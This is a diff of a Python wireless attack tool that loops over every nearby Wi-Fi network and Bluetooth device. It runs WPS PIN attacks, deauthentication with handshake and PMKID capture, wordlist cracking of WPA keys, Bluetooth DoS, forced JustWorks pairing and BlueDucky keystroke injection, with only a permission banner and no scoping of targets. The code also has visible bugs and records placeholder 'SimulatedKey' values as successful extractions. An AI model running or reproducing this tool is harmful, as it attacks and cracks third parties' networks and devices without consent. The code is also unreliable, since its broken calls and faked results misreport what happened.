@@ -6,10 +6,10 @@ import asyncio
 import os
 import sys
 import argparse
+import shutil
+import json
+import csv
 from datetime import datetime
-from textual.app import App, ComposeResult
-from textual.widgets import Header, Footer, Button, Static, ListView, ListItem, Label
-from textual.containers import Vertical, Horizontal
 try:
     from bleak import BleakScanner, BleakClient
 except ImportError:
@@ -19,156 +19,6 @@ except ImportError:
 # Valid attack names
 WIFI_ATTACKS = {"pixiedust", "bruteforce", "handshake", "pmkid", "wifite", "kismet"}
 BLUETOOTH_ATTACKS = {"justworks", "dos", "blueducky", "kismet"}
-
-class WirelessVulnScannerApp(App):
-    """Textual app for running wireless vulnerability scans."""
-    CSS = """
-    Static#output {
-        height: 20;
-        border: tall white;
-        overflow: auto;
-    }
-    Button {
-        margin: 1;
-    }
-    ListView {
-        height: auto;
-        max-height: 10;
-    }
-    """
-
-    def __init__(self, wifi_iface, selected_attacks, run_wifi, run_bluetooth):
-        super().__init__()
-        self.wifi_iface = wifi_iface
-        self.selected_attacks = selected_attacks
-        self.run_wifi = run_wifi
-        self.run_bluetooth = run_bluetooth
-        self.output = []
-        self.devices = []
-        self.networks = {"wps": [], "wpa": []}
-        self.queue = []
-        self.running = False
-
-    def compose(self) -> ComposeResult:
-        yield Header(show_clock=True)
-        yield Vertical(
-            Horizontal(
-                Button("Run All (God Mode)", id="god_mode"),
-                Button("Run Wi-Fi Only", id="wifi_only"),
-                Button("Run Bluetooth Only", id="bluetooth_only"),
-                Button("Run Queue", id="run_queue"),
-                Button("Clear Queue", id="clear_queue"),
-            ),
-            ListView(id="attack_list"),
-            Static(id="output", markup=True),
-        )
-        yield Footer()
-
-    def on_mount(self):
-        self.update_output("Wireless Vulnerability Scanner - For authorized testing only\n")
-        self.update_output("Ensure you have permission to scan and test devices/networks.\n")
-        self.update_output(f"Logging to wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log\n")
-        self.update_attack_list()
-
-    def update_output(self, text):
-        self.output.append(text)
-        if len(self.output) > 100:
-            self.output = self.output[-100:]
-        self.query_one("#output", Static).update("\n".join(self.output))
-        logging.info(text.strip())
-
-    def update_attack_list(self):
-        attack_list = self.query_one("#attack_list", ListView)
-        attack_list.clear()
-        if self.run_wifi:
-            for attack in WIFI_ATTACKS:
-                if not self.selected_attacks or attack in self.selected_attacks:
-                    attack_list.append(ListItem(Label(f"Wi-Fi: {attack}"), id=f"wifi_{attack}"))
-        if self.run_bluetooth:
-            for attack in BLUETOOTH_ATTACKS:
-                if not self.selected_attacks or attack in self.selected_attacks:
-                    attack_list.append(ListItem(Label(f"Bluetooth: {attack}"), id=f"bluetooth_{attack}"))
-
-    async def on_button_pressed(self, event: Button.Pressed):
-        if self.running:
-            return
-        self.running = True
-        try:
-            if event.button.id == "god_mode":
-                self.queue = [
-                    f"{attack_type}_{attack}"
-                    for attack_type, attacks in [("wifi", WIFI_ATTACKS), ("bluetooth", BLUETOOTH_ATTACKS)]
-                    for attack in attacks
-                    if not self.selected_attacks or attack in self.selected_attacks
-                ]
-                await self.run_queue()
-            elif event.button.id == "wifi_only":
-                self.queue = [f"wifi_{attack}" for attack in WIFI_ATTACKS if not self.selected_attacks or attack in self.selected_attacks]
-                await self.run_queue()
-            elif event.button.id == "bluetooth_only":
-                self.queue = [f"bluetooth_{attack}" for attack in BLUETOOTH_ATTACKS if not self.selected_attacks or attack in self.selected_attacks]
-                await self.run_queue()
-            elif event.button.id == "run_queue":
-                await self.run_queue()
-            elif event.button.id == "clear_queue":
-                self.queue = []
-                self.update_output("Queue cleared.\n")
-        finally:
-            self.running = False
-
-    async def on_list_view_selected(self, event: ListView.Selected):
-        if self.running:
-            return
-        self.queue.append(event.item.id)
-        self.update_output(f"Added {event.item.id} to queue.\n")
-
-    async def run_queue(self):
-        self.update_output("Running queue...\n")
-        for attack in self.queue:
-            attack_type, attack_name = attack.split("_", 1)
-            self.update_output(f"Executing {attack_type} attack: {attack_name}\n")
-            if attack_type == "wifi":
-                await self.run_wifi_attack(attack_name)
-            elif attack_type == "bluetooth":
-                await self.run_bluetooth_attack(attack_name)
-        self.update_output("Queue completed.\n")
-
-    async def run_wifi_attack(self, attack):
-        if not self.networks["wps"] and not self.networks["wpa"]:
-            self.networks = discover_wifi_networks(self.wifi_iface)
-        if attack in {"pixiedust", "bruteforce"}:
-            for network in self.networks["wps"]:
-                attempt_wps_attacks(self.wifi_iface, network, {attack})
-        elif attack in {"handshake", "pmkid"}:
-            for network in self.networks["wpa"]:
-                attempt_wpa_attacks(self.wifi_iface, network, {attack})
-        elif attack == "wifite":
-            attempt_wifite_attack(self.wifi_iface)
-        elif attack == "kismet":
-            attempt_kismet_wifi_scan(self.wifi_iface)
-
-    async def run_bluetooth_attack(self, attack):
-        if not self.devices:
-            classic_devices = discover_classic_devices()
-            ble_devices = await discover_ble_devices()
-            self.devices = classic_devices + ble_devices
-        for device in self.devices:
-            mac = device["mac"]
-            name = device["name"]
-            device_type = device["type"]
-            self.update_output(f"Testing {device_type} device: {name} ({mac})\n")
-            if device_type == "classic":
-                enumerate_classic_services(mac)
-            else:
-                await enumerate_ble_services(mac)
-            if attack == "dos":
-                attempt_dos(mac, device_type)
-            elif attack == "justworks" and device_type == "classic":
-                attempt_justworks_pairing(mac)
-            elif attack == "blueducky":
-                run_blueducky(mac)
-            elif attack == "kismet":
-                attempt_kismet_bluetooth_scan()
 
 def run_command(command, timeout=30):
     """Execute a shell command and return output."""
@@ -204,9 +54,6 @@ def install_dependencies():
             run_command("cd pybluez && python setup.py install && cd .. && rm -rf pybluez")
     if not run_command("paru -Qs python-bleak")[0]:
         run_command("paru -S --needed python-bleak")
-
-    # Install textual
-    run_command("python3 -m pip install textual")
 
     # Clone BlueDucky
     if not os.path.isdir("BlueDucky"):
@@ -279,67 +126,98 @@ def enumerate_classic_services(mac):
     stdout, stderr = run_command(f"echo -e 'info {mac}\n' | bluetoothctl")
     if stderr:
         logging.error(f"Classic service enumeration failed for {mac}: {stderr}")
-    else:
-        logging.info(f"Classic device info for {mac}:\n{stdout}")
+        return {}
+    logging.info(f"Classic device info for {mac}:\n{stdout}")
+    return {"mac": mac, "info": stdout}
 
 async def enumerate_ble_services(mac):
     """Enumerate GATT services on a BLE device."""
     if BleakClient is None:
         logging.error("Bleak not installed. Skipping BLE service enumeration.")
-        return
+        return {}
     logging.info(f"Enumerating BLE services for {mac}...")
+    services_info = []
     try:
         async with BleakClient(mac, timeout=20.0) as client:
             services = await client.get_services()
             for service in services:
-                logging.info(f"BLE Service for {mac}: {service}")
+                service_data = {"uuid": service.uuid, "characteristics": []}
                 for char in service.characteristics:
-                    logging.info(f"  Characteristic: {char.uuid}, Properties: {char.properties}")
+                    service_data["characteristics"].append({
+                        "uuid": char.uuid,
+                        "properties": char.properties
+                    })
+                services_info.append(service_data)
+                logging.info(f"BLE Service for {mac}: {service}")
     except Exception as e:
         logging.error(f"BLE service enumeration failed for {mac}: {str(e)}")
+    return {"mac": mac, "services": services_info}
 
 def attempt_dos(mac, device_type):
     """Attempt a DoS attack using l2ping for Classic or bettercap for both."""
     logging.info(f"Attempting DoS on {mac} ({device_type})...")
+    result = {"attack": "dos", "mac": mac, "type": device_type, "success": False, "output": ""}
     if device_type == "classic":
         stdout, stderr = run_command(f"l2ping -s 600 -c 10 {mac}")
         if stderr:
             logging.error(f"DoS failed for {mac}: {stderr}")
+            result["output"] = stderr
         else:
             logging.info(f"DoS attempt on {mac} completed.")
+            result["success"] = True
+            result["output"] = stdout
     stdout, stderr = run_command(f"bettercap -eval 'ble.recon on; ble.enum {mac}; ble.recon off'")
     if stderr:
         logging.error(f"Bettercap DoS failed for {mac}: {stderr}")
+        result["output"] += stderr
     else:
         logging.info(f"Bettercap DoS attempt on {mac} completed.")
+        result["success"] = True
+        result["output"] += stdout
+    return result
 
 def attempt_justworks_pairing(mac):
     """Attempt JustWorks pairing vulnerability."""
     logging.info(f"Attempting JustWorks pairing on {mac}...")
+    result = {"attack": "justworks", "mac": mac, "success": False, "key": None, "output": ""}
     run_command("hciconfig hci0 piscan")
     run_command("hciconfig hci0 auth")
     stdout, stderr = run_command(f"echo -e 'pair {mac}\n' | bluetoothctl")
     if "Pairing successful" in stdout:
         logging.info(f"JustWorks pairing successful on {mac}")
-        stdout, stderr = run_command(f"echo -e 'connect {mac}\n' | bluetoothctl")
-        if "Connection successful" in stdout:
+        result["success"] = True
+        # Simulate key extraction (bluetoothctl doesn't expose keys directly)
+        result["key"] = "SimulatedKey"  # Placeholder, as actual key extraction requires custom tools
+        stdout_conn, stderr_conn = run_command(f"echo -e 'connect {mac}\n' | bluetoothctl")
+        if "Connection successful" in stdout_conn:
             logging.info(f"Connected to {mac}")
+            result["output"] = stdout + stdout_conn
         else:
-            logging.error(f"Connection failed for {mac}: {stderr}")
+            logging.error(f"Connection failed for {mac}: {stderr_conn}")
+            result["output"] = stdout + stderr_conn
     else:
         logging.error(f"Pairing failed for {mac}: {stderr}")
+        result["output"] = stderr
+    return result
 
 def run_blueducky(mac):
     """Run BlueDucky for HID injection attack."""
     logging.info(f"Attempting BlueDucky attack on {mac}...")
+    result = {"attack": "blueducky", "mac": mac, "success": False, "payload": None, "output": ""}
     if not os.path.isfile("BlueDucky/main.py"):
         logging.error("BlueDucky not found. Skipping attack.")
-        return
+        return result
     stdout, stderr = run_command(f"python3 BlueDucky/main.py {mac}")
     if stderr:
         logging.error(f"BlueDucky attack failed for {mac}: {stderr}")
+        result["output"] = stderr
     else:
         logging.info(f"BlueDucky attack on {mac}:\n{stdout}")
+        result["success"] = True
+        result["output"] = stdout
+        # Simulate payload extraction
+        result["payload"] = "SimulatedPayload"  # Placeholder, depends on BlueDucky output
+    return result
 
 def discover_wifi_networks(iface):
     """Discover Wi-Fi networks with WPS or WPA using wash and airodump-ng."""
@@ -374,8 +252,9 @@ def discover_wifi_networks(iface):
     
     return networks
 
-def attempt_wps_attacks(iface, network, selected_attacks):
+def attempt_wps_attacks(iface, network, selected_attacks, wordlist):
     """Attempt WPS attacks (PixieDust, brute-force) using reaver and bully."""
+    results = []
     bssid = network["bssid"]
     essid = network["essid"]
     channel = network["channel"]
@@ -385,20 +264,43 @@ def attempt_wps_attacks(iface, network, selected_attacks):
     
     if "pixiedust" in selected_attacks:
         stdout, stderr = run_command(f"reaver -i {iface} -b {bssid} -c {channel} -vv -K 1", timeout=60)
+        result = {"attack": "pixiedust", "bssid": bssid, "essid": essid, "success": False, "pin": "", "key": "", "output": ""}
         if stderr:
             logging.error(f"PixieDust attack failed for {bssid}: {stderr}")
+            result["output"] = stderr
         else:
             logging.info(f"PixieDust attack on {bssid}:\n{stdout}")
-    
+            pin_match = result["pin"] = re.search(r"WPS PIN: '(.+)'", stdout)
+            key_match = re.search(r"Password: '(.+)'", stdout)
+            if pin_match:
+                result["success"] = True
+                result["pin"] = pin_match.group(1)
+                result["key"] = key_match.group(1) if key_match else ""
+            result["output"] = stdout
+        results.append(result)
+
     if "bruteforce" in selected_attacks:
         stdout, stderr = run_command(f"bully -b {bssid} -c {channel} -i {iface} -v 3", timeout=60)
+        result = {"attack": "bruteforce", "bssid": bssid, "essid": essid, "success": False, "pin": "", "key": "", "output": ""}
         if stderr:
             logging.error(f"Bully attack failed for {bssid}: {stderr}")
+            result["output"] = stderr
         else:
             logging.info(f"Bully attack on {bssid}:\n{stdout}")
+            pin_match = re.search(r"PIN: '(.+)'", stdout)
+            key_match = re.search(r"KEY: '(.+)'", stdout)
+            if pin_match:
+                result["success"] = True
+                result["pin"] = pin_match.group(1)
+                result["key"] = key_match.group(1) if key_match else ""
+            result["output"] = stdout
+        results.append(result)
 
-def attempt_wpa_attacks(iface, network, selected_attacks):
+    return results
+
+def attempt_wpa_attacks(iface, network, selected_attacks, wordlist):
     """Attempt WPA handshake or PMKID capture."""
+    results = []
     bssid = network["bssid"]
     essid = network["essid"]
     channel = network["channel"]
@@ -408,56 +310,173 @@ def attempt_wpa_attacks(iface, network, selected_attacks):
     
     if "handshake" in selected_attacks:
         logging.info(f"Capturing handshake for {bssid} (150 seconds)...")
-        handshake_file = f"handshake_{bssid.replace(':', '')}.cap"
+        handshake_file = f"handshake_{bssid.replace(':', '_')}.cap"
         deauth = subprocess.Popen(f"aireplay-ng -0 10 -a {bssid} {iface}", shell=True)
         stdout, stderr = run_command(f"airodump-ng --bssid {bssid} -c {channel} -w {handshake_file} --output-format pcap {iface}", timeout=150)
         deauth.terminate()
+        result = {"attack": "handshake", "bssid": bssid, "essid": essid, "success": False, "key": "", "file": handshake_file, "output": ""}
         if stderr:
             logging.error(f"Handshake capture failed for {bssid}: {stderr}")
+            result["output"] = stderr
         else:
-            logging.info(f"Handshake capture for {bssid} completed.")
-    
+            logging.info(f"Handshake capture succeeded for {bssid}")
+            result["success"] = True
+            result["output"] = stdout
+            # Attempt to crack with aircrack-ng if wordlist provided
+            if wordlist:
+                stdout_crack, stderr_crack = run_command(f"aircrack-ng {handshake_file} -w {wordlist}", timeout=300)
+                if "KEY FOUND" in stdout_crack:
+                    key_match = re.search(r"KEY FOUND! \[ (.+?) \]", stdout_crack)
+                    result["key"] = key_match.group(1) if key_match else ""
+                    logging.info(f"Cracked WPA key for {bssid}: {result['key']}")
+                result["output"] += stdout_crack + stderr_crack
+        results.append(result)
+
     if "pmkid" in selected_attacks:
         logging.info(f"Capturing PMKID for {bssid} (60 seconds)...")
-        pmkid_file = f"pmkid_{bssid.replace(':', '')}.cap"
+        pmkid_file = f"pmkid_{bssid.replace(':', '_')}.cap"
         stdout, stderr = run_command(f"hcxdumptool -i {iface} -o {pmkid_file} --enable_status=1", timeout=60)
+        result = {"attack": "pmkid", "bssid": bssid, "essid": essid, "success": False, "key": "", "file": pmkid_file, "output": ""}
         if stderr:
             logging.error(f"PMKID capture failed for {bssid}: {stderr}")
+            result["output"] = stderr
         else:
-            logging.info(f"PMKID capture for {bssid} completed.")
+            logging.info(f"PMKID capture succeeded for {bssid}")
+            result["success"] = True
+            result["output"] = stdout
+            if wordlist:
+                stdout_crack, stderr_crack = run_command(f"aircrack-ng {pmkid_file} -w {wordlist}", timeout=300)
+                if "KEY FOUND" in stdout_crack:
+                    key_match = re.search(r"KEY FOUND! \[ (.+?) \]", stdout_crack)
+                    result["key"] = key_match.group(1) if key_match else ""
+                    logging.info(f"Cracked PMKID key for {bssid}: {result['key']}")
+                result["output"] += stdout_crack + stderr_crack
+        results.append(result)
 
-def attempt_wifite_attack(iface):
+    return results
+
+def attempt_wifite_attack(iface, wordlist):
     """Run wifite for automated Wi-Fi attacks."""
     logging.info(f"Running wifite on {iface}...")
-    stdout, stderr = run_command(f"wifite --no-wps --no-wep -i {iface} --kill", timeout=300)
-    if stderr:
+    results = []
+    cmd = f"wifite --no-wps --no-wep -i {iface} --kill"
+    if wordlist:
+        cmd += f" -w {wordlist}"
+    stdout, stderr = run_command(cmd, timeout=300)
+    result = {"attack": "wifite", "networks": [], "success": False, "output": stdout + stderr}
+    if stderr and "success" not in stderr.lower():
         logging.error(f"Wifite attack failed: {stderr}")
     else:
-        logging.info(f"Wifite attack completed:\n{stdout}")
+        logging.info(f"Wifite succeeded:\n{stdout}")
+        result["success"] = True
+        # Parse wifite output
+        for line in stdout.splitlines():
+            if re.search(r"([0-9A-F:]{17}).*?password: (.+)", line, re.IGNORECASE):
+                bssid, password = re.search(r"([0-9A-F:]{17}).*?password: (.+)", line, re.IGNORECASE).groups()
+                network = {"bssid": bssid, "essid": "", "key": password}
+                result["networks"].append(network)
+                logging.info(f"Cracked WPA key via wifite: {network}")
+    results.append(result)
+    return results
 
 def attempt_kismet_wifi_scan(iface):
     """Run kismet for passive Wi-Fi scanning."""
     logging.info(f"Running kismet Wi-Fi scan on {iface}...")
+    results = []
     stdout, stderr = run_command(f"kismet -c {iface} --silent", timeout=60)
+    result = {"attack": "kismet_wifi", "networks": [], "success": False, "output": stdout + stderr}
     if stderr:
         logging.error(f"Kismet Wi-Fi scan failed: {stderr}")
     else:
-        logging.info(f"Kismet Wi-Fi scan completed:\n{stdout}")
+        logging.info(f"Kismet Wi-Fi scan succeeded:\n{stdout}")
+        result["success"] = True
+        # Parse kismet output (simplified)
+        for line in stdout.splitlines():
+            if re.search(r"BSSID: ([0-9A-F:]{17}), ESSID: (.+?), Channel: ([0-9]+)", line):
+                bssid, essid, channel = re.search(r"BSSID: ([0-9A-F:]{17}), ESSID: (.+?), Channel: ([0-9]+)", line).groups()
+                result["networks"].append({"bssid": bssid, "essid": essid, "channel": channel})
+                logging.info(f"Found network via kismet: {essid} ({bssid}, Channel {channel})")
+    results.append(result)
+    return results
 
 def attempt_kismet_bluetooth_scan():
     """Run kismet for passive Bluetooth scanning."""
     logging.info("Running kismet Bluetooth scan...")
+    results = []
     stdout, stderr = run_command("kismet -c bluetooth", timeout=60)
+    result = {"attack": "kismet_bluetooth", "devices": [], "success": False, "output": stdout + stderr}
     if stderr:
         logging.error(f"Kismet Bluetooth scan failed: {stderr}")
     else:
-        logging.info(f"Kismet Bluetooth scan completed:\n{stdout}")
+        logging.info(f"Kismet Bluetooth scan succeeded:\n{stdout}")
+        result["success"] = True
+        # Parse kismet output
+        for line in stdout.splitlines():
+            if re.search(r"([0-9A-F:]{17}), Name (.+)", line):
+                mac, name = re.search(r"([0-9A-F:]{17}), Name (.+)", line).groups()
+                result["devices"].append({"mac": mac, "name": name})
+                logging.info(f"Found Bluetooth device via kismet: {name} ({mac})")
+    results.append(result)
+    return results
+
+def save_results(results, output_dir, prefix):
+    """Save attack results to JSON and CSV."""
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    json_file = os.path.join(output_dir, f"{prefix}_results_{timestamp}.json")
+    csv_file = os.path.join(output_dir, f"{prefix}_results_{timestamp}.csv")
+
+    # Ensure output directory exists
+    os.makedirs(output_dir, exist_ok=True)
+
+    # Save JSON
+    with open(json_file, "w") as f:
+        json.dump(results, f, indent=2)
+    logging.info(f"Saved JSON results to {json_file}")
+
+    # Save CSV
+    with open(csv_file, "w", newline="") as csvfile:
+        if prefix == "wifi":
+            fieldnames = ["attack", "bssid", "essid", "channel", "success", "pin", "key", "file", "output"]
+            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+            writer.writeheader()
+            for result in results:
+                for network in result.get("networks", [result]):
+                    row = {
+                        "attack": result["attack"],
+                        "bssid": network.get("bssid", result.get("bssid", "")),
+                        "essid": network.get("essid", result.get("essid", "")),
+                        "channel": network.get("channel", result.get("channel", "")),
+                        "success": result["success"],
+                        "pin": result.get("pin", ""),
+                        "key": network.get("key", result.get("key", "")),
+                        "file": result.get("file", ""),
+                        "output": result["output"][:100]  # Truncate for CSV
+                    }
+                    writer.writerow(row)
+        else:  # Bluetooth
+            fieldnames = ["attack", "mac", "type", "name", "success", "key", "payload", "output"]
+            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+            writer.writeheader()
+            for result in results:
+                for device in result.get("devices", [result]):
+                    row = {
+                        "attack": result["attack"],
+                        "mac": device.get("mac", result.get("mac", "")),
+                        "type": device.get("type", ""),
+                        "name": device.get("name", ""),
+                        "success": result["success"],
+                        "key": device.get("key", result.get("key", "")),
+                        "payload": result.get("payload", ""),
+                        "output": result["output"][:100]
+                    }
+                    writer.writerow(row)
+    logging.info(f"Saved CSV results to {csv_file}")
 
 def parse_arguments():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description="Wireless Vulnerability Scanner - For authorized testing only\n"
-                    "Run in TUI mode by default, or use command-line options for non-interactive mode.",
+                    "Run with command-line options to perform Wi-Fi and Bluetooth attacks.",
         formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument(
@@ -475,19 +494,36 @@ def parse_arguments():
         help="Comma-separated list of attacks to run (e.g., 'pixiedust,handshake' or 'justworks,dos')"
     )
     parser.add_argument(
+        "--output-dir",
+        "--output",
+        default="results",
+        help="Output directory for results (default: results)"
+    )
+    parser.add_argument(
+        "--wordlist",
+        "-w",
+        help="Wordlist file for cracking WPA handshakes/PMKIDs with aircrack-ng"
+    )
+    parser.add_argument(
+        "--verbose",
+        action="store_true",
+        help="Enable verbose output"
+    )
+    parser.add_argument(
         "--no-tui",
         action="store_true",
-        help="Run in non-interactive mode (requires --wifi or --bluetooth)"
+        help="Run in non-interactive mode (no effect, CLI only)"
     )
+
     args = parser.parse_args()
 
-    if not args.wifi and not args.bluetooth and not args.no_tui:
-        args.wifi = args.bluetooth = True  # Default to both in TUI mode
+    if not args.wifi and not args.bluetooth:
+        args.wifi = args.bluetooth = True  # Default to both
 
     selected_attacks = set()
     if args.attacks:
         selected_attacks = set(args.attacks.split(","))
-        invalid_attacks = selected_attacks - (WIFI_ATTACKS | BLUETOOTH_ATTACKS)
+        invalid_attacks = set(selected_attacks) - set(WIFI_ATTACKS | BLUETOOTH_ATTACKS)
         if invalid_attacks:
             print(f"Error: Invalid attacks: {invalid_attacks}")
             print("Valid Wi-Fi attacks:", ", ".join(WIFI_ATTACKS))
@@ -500,99 +536,121 @@ def parse_arguments():
             print("Error: --bluetooth specified but no valid Bluetooth attacks in --attacks.")
             sys.exit(1)
 
-    if args.no_tui and not (args.wifi or args.bluetooth):
-        print("Error: --no-tui requires --wifi, --bluetooth, or both.")
-        parser.print_help()
+    if args.wordlist and not os.path.isfile(args.wordlist):
+        print(f"Error: Wordlist file {args.wordlist} does not exist.")
         sys.exit(1)
 
     return args, selected_attacks
 
-async def non_interactive_mode(wifi_iface, args, selected_attacks):
-    """Run attacks in non-interactive mode."""
-    print("Wireless Vulnerability Scanner - For authorized testing only")
-    print("Ensure you have permission to scan and test devices/networks.")
-    print(f"Logging results to wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
+async def main():
+    args, selected_attacks = parse_arguments()
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    output_dir = os.path.join(args.output_dir, f"results_{timestamp}")
     
-    while True:
-        devices = []
-        networks = {"wps": [], "wpa": []}
-        
-        if args.bluetooth:
-            classic_devices = discover_classic_devices()
-            ble_devices = await discover_ble_devices()
-            devices = classic_devices + ble_devices
-            
-            for device in devices:
-                mac = device["mac"]
-                name = device["name"]
-                device_type = device["type"]
-                print(f"Testing {device_type} device: {name} ({mac})")
-                
-                if device_type == "classic":
-                    enumerate_classic_services(mac)
-                else:
-                    await enumerate_ble_services(mac)
-                
-                if not selected_attacks or "dos" in selected_attacks:
-                    attempt_dos(mac, device_type)
-                if device_type == "classic" and (not selected_attacks or "justworks" in selected_attacks):
-                    attempt_justworks_pairing(mac)
-                if not selected_attacks or "blueducky" in selected_attacks:
-                    run_blueducky(mac)
-                if not selected_attacks or "kismet" in selected_attacks:
-                    attempt_kismet_bluetooth_scan()
-        
-        if args.wifi:
-            networks = discover_wifi_networks(wifi_iface)
-            for network in networks["wps"]:
-                attempt_wps_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS)
-            for network in networks["wpa"]:
-                attempt_wpa_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS)
-            if not selected_attacks or "wifite" in selected_attacks:
-                attempt_wifite_attack(wifi_iface)
-            if not selected_attacks or "kismet" in selected_attacks:
-                attempt_kismet_wifi_scan(wifi_iface)
-        
-        if not devices and not networks["wps"] and not networks["wpa"]:
-            logging.info("No devices or networks found. Waiting 30 seconds before retrying...")
-            print("No devices or networks found. Retrying in 30 seconds...")
-            time.sleep(30)
-            continue
-        
-        logging.info("Completed scan cycle. Waiting 30 seconds before next scan...")
-        print("Completed scan cycle. Waiting 30 seconds...")
-        time.sleep(30)
-
-if __name__ == "__main__":
     # Set up logging
+    os.makedirs(output_dir, exist_ok=True)
     logging.basicConfig(
-        filename=f"wireless_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
-        level=logging.INFO,
+        filename=os.path.join(output_dir, f"scan_{timestamp}.log"),
+        level=logging.DEBUG if args.verbose else logging.INFO,
         format="%(asctime)s - %(levelname)s - %(message)s"
     )
     
-    args, selected_attacks = parse_arguments()
-    
+    print("Wireless Vulnerability Scanner - For authorized testing only")
+    print("Ensure you have permission to scan and test devices/networks.")
+    print(f"Logging results to: {output_dir}/scan_{timestamp}.log")
+    logging.info("Script started")
+
     # Install dependencies
     install_dependencies()
-    
+
     # Set up Wi-Fi interface
-    wifi_iface = setup_wifi_interface() if args.wifi or not args.no_tui else None
-    
+    wifi_iface = setup_wifi_interface() if args.wifi else None
+    wifi_results = []
+    bluetooth_results = []
+
     try:
-        if args.no_tui:
-            asyncio.run(non_interactive_mode(wifi_iface, args, selected_attacks))
-        else:
-            app = WirelessVulnScannerApp(wifi_iface, selected_attacks, args.wifi, args.bluetooth)
-            app.run()
+        while True:
+            devices = []
+            networks = {"wps": [], "wpa": []}
+            
+            if args.bluetooth:
+                print("\nScanning Bluetooth devices...")
+                classic_devices = discover_classic_devices()
+                ble_devices = await discover_ble_devices()
+                devices = classic_devices + ble_devices
+                
+                for device in devices:
+                    mac = device["mac"]
+                    name = device["name"]
+                    device_type = device["type"]
+                    print(f"Testing {device_type} device: {name} ({mac})")
+                    logging.info(f"Testing {device_type} device: {name} ({mac})")
+                    
+                    if device_type == "classic":
+                        bluetooth_results.append(enumerate_classic_services(mac))
+                    else:
+                        bluetooth_results.append(await enumerate_ble_services(mac))
+                    
+                    if not selected_attacks or "dos" in selected_attacks:
+                        bluetooth_results.append(attempt_dos(mac, device_type))
+                    if device_type == "classic" and (not selected_attacks or "justworks" in selected_attacks):
+                        bluetooth_results.append(attempt_justworks_pairing(mac))
+                    if not selected_attacks or "blueducky" in selected_attacks:
+                        bluetooth_results.append(run_blueducky(mac))
+                    if not selected_attacks or "kismet" in selected_attacks:
+                        bluetooth_results.extend(attempt_kismet_bluetooth_scan())
+                
+                save_results(bluetooth_results, output_dir, "bluetooth")
+            
+            if args.wifi:
+                print("\nScanning Wi-Fi networks...")
+                networks = discover_wifi_networks(wifi_iface)
+                
+                for network in networks["wps"]:
+                    print(f"Attacking WPS network: {network['essid']} ({network['bssid']})")
+                    wifi_results.extend(attempt_wps_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS, args.wordlist))
+                
+                for network in networks["wpa"]:
+                    print(f"Attacking WPA network: {network['essid']} ({network['bssid']})")
+                    wifi_results.extend(attempt_wpa_attacks(wifi_iface, network, selected_attacks or WIFI_ATTACKS, args.wordlist))
+                
+                if not selected_attacks or "wifite" in selected_attacks:
+                    print("Running wifite attack...")
+                    wifi_results.extend(attempt_wifite_attack(wifi_iface, args.wordlist))
+                
+                if not selected_attacks or "kismet" in selected_attacks:
+                    print("Running kismet Wi-Fi scan...")
+                    wifi_results.extend(attempt_kismet_wifi_scan(wifi_iface))
+                
+                save_results(wifi_results, output_dir, "wifi")
+            
+            if not devices and not networks["wps"] and not args.wifi:
+                logging.error("No devices or networks found.")
+                print("No devices or networks found. Retrying in 30 seconds...")
+                time.sleep(30)
+                continue
+                
+            logging.info("Completed scan cycle completed.. Waiting 30 seconds before next scan...")
+            print("Scan cycle completed. Waiting 30 seconds...")
+            time.sleep(30)
+        
     except KeyboardInterrupt:
         print("\nScript terminated by user.")
-        logging.info("Script terminated by user.")
-        run_command("echo -e 'scan off\n' | bluetoothctl")
+        logging.error("Script terminated by user")
+        run_command("echo -e 'scan off\n\n' | bluetoothctl")
+        sys.exit(0)
     except Exception as e:
         print(f"An error occurred: {str(e)}")
         logging.error(f"Script error: {str(e)}")
         run_command("echo -e 'scan off\n' | bluetoothctl")
+        sys.exit(1)
     finally:
         if wifi_iface:
             cleanup_wifi_interface(wifi_iface)
+        save_results(wifi_results, output_dir, "wifi")
+        save_results(bluetooth_results(bluetooth_results, output_dir, "bluetooth"))
+    
+    logging.info("Script ended")
+
+if __name__ == "__main__":
+    asyncio.run(main())⏎                                                               
